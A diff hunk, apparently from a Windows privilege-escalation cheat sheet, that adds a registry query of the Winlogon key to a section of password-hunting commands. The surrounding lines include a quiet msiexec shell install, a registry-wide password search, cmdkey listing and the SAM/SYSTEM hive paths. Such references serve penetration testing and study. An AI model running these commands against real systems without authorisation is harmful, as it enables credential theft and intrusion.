@@ -84,6 +84,7 @@ msiexec /quiet /qn /i "path_to_shell"
 ------PASSWORDS------
 
 reg query HKLM /f password /t REG_SZ /s
+reg query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
 cmdkey /list
 C:\Windows\Repair\SAM
 C:\Windows\Repair\SYSTEM
